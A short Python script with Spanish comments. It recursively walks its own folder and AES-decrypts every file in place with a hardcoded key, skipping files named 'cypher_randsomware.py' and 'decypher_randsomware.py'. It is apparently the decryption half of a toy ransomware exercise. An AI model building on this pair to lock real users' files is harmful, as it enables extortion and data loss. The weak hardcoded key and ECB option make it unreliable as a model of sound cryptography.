import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def get_directory_content(path, ignore_files_in_root=[]):
    """
    Obtiene el contenido de un directorio de forma recursiva.
    Retorna (tipo, nombre, contenido) donde tipo es "directory" o "file". 
    Si es un directorio, el contenido es una lista de elementos con la misma estructura.
    """
    # Verificar si la ruta es un directorio
    if os.path.isdir(path):
        directory = ("directory", os.path.basename(path), [])
        
        # Recorrer los elementos dentro del directorio
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path):
                # Si es un directorio, llamar recursivamente
                directory[2].append(get_directory_content(item_path))
            else:
                # Si es un archivo, agregar
                if item not in ignore_files_in_root:
                    directory[2].append(("file", item, None))
        
        return directory
    else:
        raise ValueError(f"La ruta {path} no es un directorio.")

def aes_decrypt(ciphertext, key, mode):
    try:
        if mode.lower() == 'cbc':

            iv = ciphertext[:16]  # Extraemos IV
            real_ciphertext = ciphertext[16:]
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext_padded = cipher.decrypt(real_ciphertext)
            return unpad(plaintext_padded, AES.block_size)
            
        elif mode.lower() == 'ecb':
            # Verificar que el tamaño del texto cifrado sea múltiplo de 16
            if len(ciphertext) % 16 != 0:
                print(f"Error: El tamaño del texto cifrado no es múltiplo de 16 (tamaño: {len(ciphertext)} bytes)")
                return ciphertext
                
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext_padded = cipher.decrypt(ciphertext)
            return unpad(plaintext_padded, AES.block_size)
            
        else:
            raise ValueError("Modo no soportado. Usa 'cbc' o 'ecb'.")
    except Exception as e:
        return ciphertext

def decrypt_recursive(directory, directory_content, key, mode="cbc"):
    for item in directory_content:
        if item[0] == "directory":
            decrypt_recursive(os.path.join(directory, item[1]), item[2], key, mode)
        else:
            file_path = os.path.join(directory, item[1])
            try:
                with open(file_path, "rb") as file:
                    ciphertext = file.read()
                    
                plaintext = aes_decrypt(ciphertext, key, mode)
                    
                with open(file_path, "wb") as file:
                    file.write(plaintext)
                    
            except Exception as e:
                print(f"Error al procesar el archivo {file_path}: {e}")

path = os.path.dirname(os.path.abspath(__file__))  # Directorio donde está el script

directory_content = get_directory_content(path, ignore_files_in_root=["cypher_randsomware.py", "decypher_randsomware.py"])[2]

key = b'1234567890qwerty'  # llave
decrypt_recursive(directory=path, directory_content=directory_content, key=key, mode="cbc")
print("Descifrado completado")